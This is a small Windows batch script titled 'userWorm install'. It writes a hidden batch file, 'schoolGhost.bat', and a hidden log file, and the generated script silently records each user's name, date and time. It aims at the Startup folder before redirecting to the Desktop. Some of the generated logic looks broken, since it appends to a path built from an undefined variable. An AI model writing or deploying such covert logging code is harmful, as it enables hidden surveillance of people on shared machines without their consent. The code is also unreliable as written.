@echo OFF
title userWorm install
set startup="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
set startup=%userprofile%\Desktop
set ghostLoc=schoolGhost.bat
set logLoc=log.log
echo @echo off > %startup%\%ghostLoc%
attrib +h %startup%\%ghostLoc%
echo init >> %userprofile%\Desktop\log.log
attrib +h %userprofile%\Desktop\log.log
echo set fileLoc=%%userprofile%%\Desktop\%logLoc% >> %startup%\%ghostLoc%
echo for /F "tokens=2" %%%%i in ('date/t') do set mydate=%%%%i >> %startup%\%ghostLoc%
echo set mytime=%%time%% >> %startup%\%ghostLoc%
echo set sendLine=%%username%%             (%%mydate%%)(%%mytime%%) >> %startup%\%ghostLoc%
echo echo %%sendLine%% ^>^> %%fileLoc%%\%%file%% >> %startup%\%ghostLoc%
echo attrib +h %%fileLoc%% >> %startup%\%ghostLoc%